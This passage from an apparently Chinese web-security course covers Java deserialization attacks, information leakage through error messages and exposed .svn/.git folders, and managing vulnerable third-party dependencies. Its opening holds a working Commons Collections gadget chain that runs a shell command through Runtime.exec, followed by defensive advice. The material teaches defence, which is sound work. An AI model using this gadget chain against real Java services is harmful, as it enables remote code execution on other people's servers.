IOException, NoSuchMethodException </span>&#123;</span><br><span class="line">        Object evilObject = getEvilObject();</span><br><span class="line">        <span class="keyword">byte</span>[] serializedObject = serializeToByteArray(evilObject);</span><br><span class="line">        deserializeFromByteArray(serializedObject);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getEvilObject</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException </span>&#123;</span><br><span class="line">        String[] command = &#123;<span class="string">"open -a calculator"</span>&#125;;</span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line"><span class="class">                        <span class="title">command</span></span></span><br><span class="line"><span class="class">                )</span></span><br><span class="line"><span class="class">        &#125;</span>;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        String classToSerialize = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; constructor = Class.forName(classToSerialize).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler secondInvocationHandler = (InvocationHandler) constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">lazyMap</span>)</span>;</span><br><span class="line">        Proxy evilProxy = (Proxy) Proxy.newProxyInstance(Deserialize.class.getClassLoader(), new Class[]&#123;Map.class&#125;, secondInvocationHandler);</span><br><span class="line">        InvocationHandler invocationHandlerToSerialize = (InvocationHandler) constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">evilProxy</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> invocationHandlerToSerialize;</span><br><span class="line">        <span class="comment">/*Transformer[] transformers = new Transformer[] &#123;</span></span><br><span class="line"><span class="comment">                new ConstantTransformer(Runtime.class),</span></span><br><span class="line"><span class="comment">                new InvokerTransformer("getMethod", new Class[] &#123;</span></span><br><span class="line"><span class="comment">                        String.class, Class[].class &#125;, new Object[] &#123;</span></span><br><span class="line"><span class="comment">                        "getRuntime", new Class[0] &#125;),</span></span><br><span class="line"><span class="comment">                new InvokerTransformer("invoke", new Class[] &#123;</span></span><br><span class="line"><span class="comment">                        Object.class, Object[].class &#125;, new Object[] &#123;</span></span><br><span class="line"><span class="comment">                        null, new Object[0] &#125;),</span></span><br><span class="line"><span class="comment">                new InvokerTransformer("exec", new Class[] &#123;</span></span><br><span class="line"><span class="comment">                        String.class &#125;, new Object[] &#123;"open -a calculator"&#125;)&#125;;</span></span><br><span class="line"><span class="comment">        Transformer chain = new ChainedTransformer(transformers);</span></span><br><span class="line"><span class="comment">        Map innerMap = new HashMap&lt;String, Object&gt;();</span></span><br><span class="line"><span class="comment">        innerMap.put("key", "value");</span></span><br><span class="line"><span class="comment">        Map&lt;String, Object&gt; outerMap = TransformedMap.decorate(innerMap, null, chain);</span></span><br><span class="line"><span class="comment">        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");</span></span><br><span class="line"><span class="comment">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span></span><br><span class="line"><span class="comment">        ctor.setAccessible(true);</span></span><br><span class="line"><span class="comment">        Object instance = ctor.newInstance(Target.class, outerMap);</span></span><br><span class="line"><span class="comment">        return instance;*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deserializeAndDoNothing</span><span class="params">(<span class="keyword">byte</span>[] byteArray)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(byteArray));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serializeToByteArray(Object object) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ByteArrayOutputStream serializedObjectOutputContainer = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(serializedObjectOutputContainer);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        <span class="keyword">return</span> serializedObjectOutputContainer.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">deserializeFromByteArray</span><span class="params">(<span class="keyword">byte</span>[] serializedObject)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ByteArrayInputStream serializedObjectInputContainer = <span class="keyword">new</span> ByteArrayInputStream(serializedObject);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(serializedObjectInputContainer);</span><br><span class="line">        InvocationHandler evilInvocationHandler = (InvocationHandler) objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> evilInvocationHandler;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面我们来分析一下这段代码的逻辑。</p><p>在 Java 通过ObjectInputStream.readObject()进行反序列化操作的时候，ObjectInputStream 会根据序列化数据寻找对应的实现类（在 payload 中是sun.reflect.annotation.AnnotationInvocationHandler）。如果实现类存在，Java 就会调用其 readObject 方法。因此，AnnotationInvocationHandler.readObject方法在反序列化过程中会被调用。</p><p>AnnotationInvocationHandler在readObject的过程中会调用streamVals.entrySet()。其中，streamVals是AnnotationInvocationHandler构造函数中的第二个参数。这个参数可以在数据中进行指定。而黑客定义的是 Proxy 类，也就是说，黑客会让这个参数的实际值等于 Proxy。</p><p><img src="/images/security/security-web/12.jpg" alt="12"></p><p>Proxy 是动态代理，它会基于 Java 反射机制去动态实现代理类的功能。在 Java 中，调用一个 Proxy 类的 entrySet() 方法，实际上就是在调用InvocationHandler中的invoke方法。在 invoke 方法中，Java 又会调用memberValues.get(member)。其中，memberValues是AnnotationInvocationHandler构造函数中的第二个参数。</p><p>同样地，memberValues这个参数也能够在数据中进行指定，而这次黑客定义的就是 LazyMap 类。member 是方法名，也就是 entrySet。因此，我们最终会调用到LazyMap.get(“entrySet”)这个逻辑。</p><p><img src="/images/security/security-web/13.jpg" alt="13"></p><p>当 LazyMap 需要 get 某个参数的时候，如果之前没有获取过，则会调用ChainedTransformer.transform进行构造。</p><p><img src="/images/security/security-web/14.jpg" alt="14"></p><p>ChainedTransformer.transform会将我们构造的几个 InvokerTransformer 顺次执行。而在InvokerTransformer.transform中，它会通过反射的方法，顺次执行我们定义好的 Java 语句，最终调用Runtime.getRuntime().exec(“open -a calculator”)实现命令执行的功能。</p><p><img src="/images/security/security-web/15.jpg" alt="15"></p><p>这个过程的确比较烧脑。我带你再来总结一下，简单来说，其实就是以下 4 步：</p><ol><li>黑客构造一个恶意的调用链（专业术语为 POP，Property Oriented Programming），并将其序列化成数据，然后发送给应用；</li><li>应用接收数据。大部分应用都有接收外部输入的地方，比如各种 HTTP 接口。而这个输入的数据就有可能是序列化数据；</li><li>应用进行反序列操作。收到数据后，应用尝试将数据构造成对象；</li><li>应用在反序列化过程中，会调用黑客构造的调用链，使得应用会执行黑客的任意命令。</li></ol><p>那么，在这个反序列化的过程中，应用为什么会执行黑客构造的调用链呢？这是因为，反序列化的过程其实就是一个数据到对象的过程。在这个过程中，应用必须根据数据源去调用一些默认方法（比如构造函数和 Getter/Setter）。</p><p>除了这些方法，反序列化的过程中，还会涉及一些接口类或者基类（简单的如：Map、List 和 Object）。应用也必须根据数据源，去判断选择哪一个具体的接口实现类。也就是说，黑客可以控制反序列化过程中，应用要调用的接口实现类的默认方法。通过对不同接口类的默认方法进行组合，黑客就可以控制反序列化的调用过程，实现执行任意命令的功能。</p><h3 id="通过反序列化漏洞，黑客能做什么？"><a href="#通过反序列化漏洞，黑客能做什么？" class="headerlink" title="通过反序列化漏洞，黑客能做什么？"></a>通过反序列化漏洞，黑客能做什么？</h3><p>学习了前面的例子，我们已经知道，通过反序列化漏洞，黑客可以调用到Runtime.exec()来进行命令执行。换一句话说，黑客已经能够在服务器上执行任意的命令，这就相当于间接掌控了你的服务器，能够干任何他想干的事情了。</p><p>即使你对服务器进行了一定的安全防护，控制了黑客掌控服务器所产生的影响，黑客还是能够利用反序列化漏洞，来发起拒绝服务攻击。比如，曾经有人就提出过这样的方式，通过 HashSet 的相互引用，构造出一个 100 层的 HashSet，其中包含 200 个 HashSet 的实例和 100 个 String，结构如下图所示。</p><p><img src="/images/security/security-web/16.jpg" alt="16"></p><p>对于多层嵌套的对象，Java 在反序列化过程中，需要调用的方法呈指数增加。因此，尽管这个序列化的数组大概只有 6KB，但是面对这种 100 层的数据，Java 所需要执行的方法数是近乎无穷的（n 的 100 次方）。也就是说，黑客可以通过构建一个体积很小的数据，增加应用在反序列化过程中需要调用的方法数，以此来耗尽 CPU 资源，达到影响服务器可用性的目的。</p><h3 id="如何进行反序列化漏洞防护-？"><a href="#如何进行反序列化漏洞防护-？" class="headerlink" title="如何进行反序列化漏洞防护 ？"></a>如何进行反序列化漏洞防护 ？</h3><p>既然反序列化漏洞危害这么大，我们能不能直接剔除它们呢？显然是不可能的，尤其是 JSON，作为目前最热门的跨平台数据交换格式之一，其易用性是显而易见的，你不可能因为这些还没发生的危害就剔除它们。因此，我们要采取一些有效的手段，在把反序列化操作的优势发挥出来的同时，去避免反序列化漏洞的出现。我们来看 3 种具体的防护方法：认证、限制类和 RASP 检测。</p><h4 id="认证和签名"><a href="#认证和签名" class="headerlink" title="认证和签名"></a>认证和签名</h4><p>首先，最简单的，我们可以通过认证，来避免应用接受黑客的异常输入。要知道，很多序列化和反序列化的服务并不是提供给用户的，而是提供给服务自身的。比如，存储一个对象到硬盘、发送一个对象到另外一个服务中去。对于这些点对点的服务，我们可以通过加入签名的方式来进行防护。比如，对存储的数据进行签名，以此对调用来源进行身份校验。只要黑客获取不到密钥信息，它就无法向进行反序列化的服务接口发送数据，也就无从发起反序列化攻击了。</p><h4 id="限制序列化和反序列化的类"><a href="#限制序列化和反序列化的类" class="headerlink" title="限制序列化和反序列化的类"></a>限制序列化和反序列化的类</h4><p>在反序列化漏洞中，黑客需要构建调用链，而调用链是基于类的默认方法来构造的。然而，大部分类的默认方法逻辑很少，无法串联成完整调用链。因此，在调用链中通常会涉及非常规的类，比如，刚才那个 demo 中的 InvokerTransformer。我相信 99.99% 的人都不会去序列化这个类。因此，我们可以通过构建黑名单的方式，来检测反序列化过程中调用链的异常。</p><p>在 Fastjson 的配置文件中，就维护了一个黑名单的列表，其中包括了很多可能执行代码的方法类。这些类都是平常会使用，但不会序列化的一些工具类，因此我们可以将它们纳入到黑名单中，不允许应用反序列化这些类（在最新的版本中，已经更改为 hashcode 的形式）。</p><p>我们在日常使用 Fastjson 或者其他 JSON 转化工具的过程中，需要注意避免序列化和反序列化接口类。这就相当于白名单的过滤：只允许某些类可以被反序列化。我认为，只要你在反序列化的过程中，避免了所有的接口类（包括类成员中的接口、泛型等），黑客其实就没有办法控制应用反序列化过程中所使用的类，也就没有办法构造出调用链，自然也就无法利用反序列化漏洞了。</p><h4 id="RASP-检测"><a href="#RASP-检测" class="headerlink" title="RASP 检测"></a>RASP 检测</h4><p>业内推出了 RASP（Runtime Application Self-Protection，实时程序自我保护）。RASP 通过 hook 等方式，在这些关键函数的调用中，增加一道规则的检测。这个规则会判断应用是否执行了非应用本身的逻辑，能够在不修改代码的情况下对反序列化漏洞攻击实现拦截。简单来说，通过 RASP，我们就能够检测到应用中的非正常代码执行操作。</p><p><strong>小结</strong></p><p><img src="/images/security/security-web/17.jpg" alt="17"></p><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>你平时在 Debug 的时候，一定首先会去查看错误信息。根据错误信息，你能够了解究竟是什么情况引发了什么样的错误。同样地，黑客也能够通过错误信息，推断出你的后台代码逻辑</p><h3 id="为什么错误信息会泄露代码逻辑？"><a href="#为什么错误信息会泄露代码逻辑？" class="headerlink" title="为什么错误信息会泄露代码逻辑？"></a>为什么错误信息会泄露代码逻辑？</h3><p>当黑客在登录某个页面时，在用户名位置输入一个单引号，在密码位置输入一个“g”之后，就会出现如下的错误信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">An Error Has Occurred.</span><br><span class="line">    Error Message:</span><br><span class="line">   System.Data.OleDb.OleDbException: Syntax error (missing operator) in query expression &#39;username &#x3D; &#39;&#39;&#39; and password &#x3D; &#39;g&#39;&#39;. at</span><br><span class="line">  System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling ( Int32 hr) at</span><br><span class="line">  System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult ( tagDBPARAMS dbParams,  Object&amp; exe</span><br></pre></td></tr></table></figure><p>从这个错误信息中，我们可以看到，网页最终执行了一个 SQL 语句，这个 SQL 语句的部分内容为username = ‘’’ and password = ‘g’。因此，后台的大致逻辑应该是下面这样的。</p><p>第一，错误信息反馈的是 Syntax error，即语法错误。在密码位置输入单个字母“g”肯定不会引起错误，所以，这个 SQL 语句是因为多了一个单引号导致的报错。而如果使用了 PreparedStatement 等方法，是不会产生这个错误的。因此，后台的 SQL 查询应该是直接采用的字符串拼接，且没有过滤单引号。</p><p>第二，错误信息中显示了部分的 WHERE 条件是username = ‘’ and password = ‘’。这又是一个登录的逻辑，所以，只要用户名和密码正确，这个 SQL 语句会返回黑客需要的用户信息。因此，后台的 SQL 语句应该是形如 select from where 的格式。</p><p>根据这些信息，黑客很容易就可以发起 SQL 注入攻击了。</p><p>在 Java Spring 中，我们也可以通过配置 ExceptionHandler 等来进行处理，避免被直接展示到前端。</p><p>避免错误信息泄露代码逻辑，一方面是要通过正确的配置文件，避免错误信息被展示到前端；另一方面是要对错误信息进行检测，这里就需要用到“黑盒”检测了。</p><p>所谓“黑盒（Black Box Testing，功能测试）”，就是在不获取代码的情况下，直接运行应用，然后对应用的请求和响应进行扫描。比如，在错误信息泄露的场景中，“黑盒”检测可以向应用发起一些必然会导致错误的请求（比如上述例子中的单引号），然后观察应用是返回完整的错误日志，还是返回某些经过处理的页面。</p><p>好了，现在你应该明白了，为啥错误信息会泄露代码逻辑。实际上，错误信息泄露属于一种间接的信息泄露方式。间接的信息泄露方式主要是通过拼凑各种零散信息，还原出代码整体的面貌，然后有针对性地发起攻击。所以我们常说，黑客的攻击本身就是一个“聚沙成塔”的过程。</p><h3 id="除了错误信息，还有什么地方会泄露代码逻辑？"><a href="#除了错误信息，还有什么地方会泄露代码逻辑？" class="headerlink" title="除了错误信息，还有什么地方会泄露代码逻辑？"></a>除了错误信息，还有什么地方会泄露代码逻辑？</h3><p>除了错误信息之外，间接的信息泄露方式还有两种：返回信息泄露和注释信息泄露。</p><p>注释信息你应该很熟悉。因为所有的前端代码基本都不需要编译就可以展示在浏览器中，所以黑客很容易就可以看到前端代码中的注释信息。但是，如果这些注释信息中出现服务器 IP、数据库地址和认证密码这样的关键信息。一旦这些关键信息被泄露，将会造成十分严重的后果。</p><p>那该如何避免关键的注释信息出现在线上的代码中呢？我们经常会使用一种叫作“白盒”的代码检测方法。</p><p>所谓“白盒（White Box Testing，结构测试）”，即直接获取到线上的源代码，然后对它进行扫描。“白盒”扫描注释信息的原理比较简单，因为每一种语言的注释都会带有特殊的标记（比如 Java 和 PHP 中的 /* 等），可以比较准确地被识别出来。除此之外，“白盒”检测通常还会被用来做一些检测代码漏洞或者逻辑漏洞的工作，这一块比较复杂，现在你只需要有一个大概印象即可，我们会在后续的课程中专门来讲。</p><p>简单了解了注释信息泄露，我们下面重点来看返回信息泄露。</p><p>你可以回忆一下，在前面讲SSRF攻击的时候，我们模拟过这样一个场景：服务端在请求一个图片地址的时候，会根据地址的“存活”情况和返回数据的类型，分别返回三种结果：“图片不存在”“格式错误”以及图片正常显示。而黑客正是通过服务端返回信息的逻辑，利用一个请求图片的 SSRF，摸清整个后端的服务“存活情况”。</p><p>类似的多种返回状态的场景还有很多，你可以想想自己平时工作中有没有遇到过。这里我再说一个常见的。当你在登录应用的时候，应用的返回逻辑可能是这样的：如果输入的用户名和密码正确，则登录成功；如果应用没有这个用户，则返回“用户名不存在”；如果输入的用户名和密码不匹配，则返回“密码错误”。</p><p>尽管这样清晰的登录提示对于用户体验来说，确实是一个较优解，但这个逻辑同样也暴露了过多的信息给黑客。黑客只需要不断地发起登录请求，就能够知道应用中存在的用户名，然后通过遍历常见的弱密码进行尝试，很容易就能够猜对密码。这样一来，猜对密码的成功率就比尝试同时猜测用户名和密码要高很多。</p><p>实际上，返回信息过于明确不算是代码层面的漏洞，更多的是产品层面的漏洞。因此，理论上没有任何技术手段能够对这种漏洞进行检测，只能依靠人为的分析审计来避免。解决方案也比较简单，直接将返回信息模糊化、统一化即可。比如，在上述登录的场景中，我们可以将两种登录失败的返回信息，统一修改为“用户名不存在或密码错误”。这样一来，既避免了用户体验受到太大影响，又消除了关键信息被黑客获取的隐患。</p><h3 id="有哪些常见的直接泄露方式？"><a href="#有哪些常见的直接泄露方式？" class="headerlink" title="有哪些常见的直接泄露方式？"></a>有哪些常见的直接泄露方式？</h3><p>在间接的泄露方式中，黑客可以通过“蛛丝马迹”，推断出服务代码的逻辑。但是信息泄露最普遍的方式还是直接泄露 。这里我会讲两种常见的直接泄露方式。</p><p>第一种泄露方式与版本管理工具中的隐藏文件有关。</p><p>在开发应用的过程中，你一定使用过版本管理工具（比如 SVN 和 Git），通过这些工具，你能够很方便地进行代码回滚、备份等操作。那你有没有想过，版本管理工具为什么这么方便呢？它的工作原理又是怎么样的呢？我们以 SVN 为例来说一说。</p><p>SVN 会在项目目录中创建一个.svn 文件夹，里面保存了应用每一个版本的源文件信息，这也是 SVN 实现代码回滚的数据基础。如果 SVN 可以通过.svn 中的数据提取应用任意版本的代码，那黑客也可以。只要你没有在上线代码的时候删除其中的.svn 目录，那就代表黑客可以通过.svn 中的 URL 访问里面的所有文件。接下来，只需要通过执行简单的脚本，黑客就可以回溯出一个完整版本的代码了。</p><p>对于这种因为目录中额外内容（.svn/.git）导致的源码泄露，我们一方面需要对线上代码进行人工的代码审查，确保无关的文件和文件夹被正确地清除；另一方面，我们也可以在 HTTP 服务中对部分敏感的路径进行限制。比如，在 Apache httpd 中配置下面的内容，来禁止黑客对.svn 和.git 目录的访问。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DirectoryMatch</span> \<span class="attr">.</span>(<span class="attr">svn</span>|<span class="attr">git</span>)&gt;</span></span><br><span class="line">  Order allow,deny</span><br><span class="line">  Deny from all</span><br><span class="line"><span class="tag">&lt;/<span class="name">DirectoryMatch</span>&gt;</span></span><br></pre></td></tr></table></figure><p>除此之外，还有一种最常见、也最不容易注意的泄露方式，那就是上传代码到 GitHub 上。</p><p>我们知道，Git 除了是一个版本管理工具之外，还是一个很流行的代码管理工具。除了前面讲过的隐藏文件漏洞之外（Git 会生成.git，同样包含应用各种版本的文件信息），Git 还存在将代码上传到公开平台的问题。但是，使用 GitHub 上传代码通常属于个人行为，所以，我们很难从技术层面上进行预防。</p><p>公司应该从加强员工安全意识的培训、强化公司管理制度入手，避免员工私自上传代码。除此之外，公司还可以对 GitHub 发起巡检（比较知名的工具有<code>Hawkeye</code>），通过定期检索公司代码的关键字（比如常用的包名、域名等）来进行检测。</p><h2 id="插件漏洞"><a href="#插件漏洞" class="headerlink" title="插件漏洞"></a>插件漏洞</h2><p>在讲反序列化漏洞的时候，我们说过，这个漏洞其实就存在于 Fastjson、Jackson 等知名的 JSON 解析库中，跟你自己写的代码没有太多关系，所以极难掌控。也就是说，在开发应用的过程中，尽管你的代码很安全了，黑客还是能够通过插件漏洞对应用发起攻击（我文中提到的插件，是第三方的插件、依赖库、工具和框架等的统称）。</p><p>说到这儿，想不想测试一下你的插件是否安全？在这里，我准备了几个问题，你可以看看自己是否对所用的插件了如指掌。</p><ul><li>你所使用的所有插件的版本是什么？（包括前端和后端，直接引用和间接引用）</li><li>你所使用的这些插件，是否存在漏洞，是否不被维护了，是否被废弃了？</li><li>你所使用的这些插件，会在哪些地方发布更新信息和漏洞信息？</li><li>你所使用的这些插件，是否会定期更新？你是否会对更新插件进行完整的测试？</li><li>你所使用的这些插件，在安全方面，有哪些配置需要关注?</li></ul><h3 id="为什么要重视插件漏洞？"><a href="#为什么要重视插件漏洞？" class="headerlink" title="为什么要重视插件漏洞？"></a>为什么要重视插件漏洞？</h3><p>在谈论安全漏洞的时候，你应该经常会听到“0 day”（中文译为“零日”）这个词。到底什么是“0 day”呢？“0 day”，即在插件发布修复漏洞的安全补丁之前，黑客就已经知道漏洞细节的漏洞。换一句话说，“0 day”就是只有黑客知晓的未公开漏洞。</p><p>说到这里，不知道你有没有听说过一个叫作脏牛（CVE-2016-5195）的 Linux 系统漏洞，这个漏洞可以实现提权操作，也就是让低权限的用户获得较高权限。在这个漏洞被公开曝出之前，它已经存在于 Linux 系统中长达 9 年了，直到现在，仍然有很多黑客通过这个漏洞获取较高的系统权限。</p><p>而这其实就是一个“0 day”漏洞。因为只有黑客知道这个漏洞，而我们连这个漏洞是什么都不知道，所以“0 day”几乎无法防御。除此之外，“0 day”还具备极高的攻击有效性，可以说只要应用使用了对应的插件，黑客几乎“战无不胜”。甚至在黑市上，“0 day”漏洞都可以作为一种资产在黑客间进行交易。</p><h3 id="如何建立插件漏洞的防护体系？"><a href="#如何建立插件漏洞的防护体系？" class="headerlink" title="如何建立插件漏洞的防护体系？"></a>如何建立插件漏洞的防护体系？</h3><h4 id="第一步：整理插件，剔除无用插件"><a href="#第一步：整理插件，剔除无用插件" class="headerlink" title="第一步：整理插件，剔除无用插件"></a>第一步：整理插件，剔除无用插件</h4><p>避免插件漏洞威胁的第一步，自然是了解自己的应用都使用了哪些插件。我就以 Java 中的 Maven 插件管理工具为例，详细说一下整理和剔除插件的过程。</p><p>如果使用 Maven 作为插件管理工具的话，你一定会先通过 POM 文件去找到自己所使用的插件（即所有的 Dependency）。但是，Dependency 只是你的应用中直接使用的插件，这些插件本身也会引用很多其他插件。所以大部分应用的插件依赖树十分复杂，那你该如何整理全部的插件呢？</p><p>首先，你可以通过Maven Dependency Plugin帮助自己自动分析插件依赖树。除了展示出当前 Maven 工程中所有的使用插件，Maven Dependency Plugin 还会对插件的使用情况做进一步地分析，帮你找出在 POM 中却没在代码中使用的插件。这样，你就可以对这一类无用的插件引用及时剔除，自然也就能够减少插件漏洞出现的可能性。</p><p>比如，在下面这个分析结果中，通过mvn dependency:analyze的分析，我们发现了 JUnit 和 Logback 这类“虽然被引用但却没有被使用”的插件。既然没有被使用，那我们就可以很放心地进行删除了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mvn dependency:tree dependency:analyze</span><br><span class="line">...</span><br><span class="line">[INFO] --- maven-dependency-plugin:2.8:tree (default-cli) @ client ---</span><br><span class="line">[INFO] com.coveros:sample-maven:jar:0.0.1-SNAPSHOT</span><br><span class="line">[INFO] +- junit:junit:jar:4.11:<span class="built_in">test</span></span><br><span class="line">[INFO] |      \- org.hamcrest:hamcrest-core:jar:1.3:<span class="built_in">test</span></span><br><span class="line">[INFO] +- org.slf4j:slf4j-api:jar:1.7.5:compile</span><br><span class="line">[INFO] \- ch.qos.logback:logback-classic:jar:1.0.13:<span class="built_in">test</span></span><br><span class="line">[INFO]    \- ch.qos.logback:logback-core:jar:1.0.13:<span class="built_in">test</span></span><br><span class="line">...</span><br><span class="line">[INFO] --- maven-dependency-plugin:2.8:analyze (default-cli) @ client ---</span><br><span class="line">[WARNING] Unused declared dependencies found:</span><br><span class="line">[WARNING]    junit:junit:jar:4.11:<span class="built_in">test</span></span><br><span class="line">[WARNING]    ch.qos.logback:logback-classic:jar:1.0.13:<span class="built_in">test</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="第二步：管理插件补丁更新"><a href="#第二步：管理插件补丁更新" class="headerlink" title="第二步：管理插件补丁更新"></a>第二步：管理插件补丁更新</h4><p>建立插件防护体系的第二步，就是要知道你有哪些插件需要更新。但是，在实际工作中一个应用随便就依赖几十个插件，你当然没办法一个一个去查询插件的更新状态了。那Version Maven Plugin就是用来帮你检查版本更新的一个工具。你可以看到，在下面的分析结果中，通过mvn version:display-dependency-updates这个命令，我们就能发现 JUnit 有一个新的 4.11 版本。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mvn versions:display-plugin-updates versions:display-dependency-updates</span><br><span class="line">...</span><br><span class="line">[INFO] --- versions-maven-plugin:2.1:display-plugin-updates (default-cli) @ sample-maven ---</span><br><span class="line">[INFO]</span><br><span class="line">[INFO] The following plugin updates are available:</span><br><span class="line">[INFO]   maven-deploy-plugin ...................................... 2.7 -&gt; 2.8</span><br><span class="line">[INFO]</span><br><span class="line">[INFO] All plugins have a version specified.</span><br><span class="line">[INFO]</span><br><span class="line">[INFO] Project defines minimum Maven version as: 3.0</span><br><span class="line">[INFO] Plugins require minimum Maven version of: 3.0</span><br><span class="line">[INFO]</span><br><span class="line">[INFO] No plugins require a newer version of Maven than specified by the pom.</span><br><span class="line">[INFO]</span><br><span class="line">[INFO]</span><br><span class="line">[INFO] --- versions-maven-plugin:2.1:display-dependency-updates (default-cli) @ sample-maven ---</span><br><span class="line">[INFO] The following dependencies <span class="keyword">in</span> Dependencies have newer versions:</span><br><span class="line">[INFO]   junit:junit ............................................. 4.10 -&gt; 4.11</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>尽管 Version Maven Plugin 也提供自动更新的功能，不过我更推荐你手动进行更新。因为对于插件的版本变更，其兼容性并没有保证，而且你也无法保证，插件在更新的过程中，不会对它原本的功能产生影响。</p><p>那使用了补丁管理工具之后，我们就可以完全放心了吗？当然不是。补丁管理中依旧存在一些问题，我这里从 3 个方面帮你梳理了一下，你可以作为了解。</p><ul><li>补丁可用性：并不是所有的插件漏洞，都能有最新的补丁进行及时地更新和维护。很多时候，运维人员会面临一个已知的漏洞，但无补丁“可打”的窘迫局面。</li><li>覆盖面不全：实际上，并不是所有语言都能够很好的进行插件分析工作，这也就导致运维人员无法掌控公司内使用的所有插件。这个时候，必然会产生一定的漏洞疏忽。</li><li>更新时间延迟：为了提高打补丁的效率，补丁管理一般会按月或者按季度进行集中的打补丁工作。而在这个期间，公司的应用就会处于无保护的状<br>态。</li></ul><p>为了解决这些问题，虚拟补丁的概念就被提出了。所谓虚拟补丁，就是在不对应用插件进行升级的情况下，有效阻止攻击流量。实现的原理也很简单，即在前置的网络或系统中，对针对插件漏洞的攻击流量进行检测和拦截即可，大部分防火墙、IPS 等安全防御工具，都会提供虚拟补丁的功能。比如，2017 年，永恒之蓝肆虐的时候，防火墙会直接封禁 445 端口请求，就相当于给所有的 Windows 系统，打上了虚拟补丁。然后，只需要等到所有 Windows 都真正更新补丁之后，再放开对 445 端口的限制即可。</p><h4 id="第三步：使用公开漏洞库"><a href="#第三步：使用公开漏洞库" class="headerlink" title="第三步：使用公开漏洞库"></a>第三步：使用公开漏洞库</h4><p>最后，你还需要知道，在你所使用的插件中，是否已经存在了公开的漏洞。</p><p>实际上，每个漏洞的编号都是该漏洞在公开漏洞库的唯一编号。我提到的这三个编号，开头都是 CVE，也就是说，这三个编号的信息都存在于CVE（Common 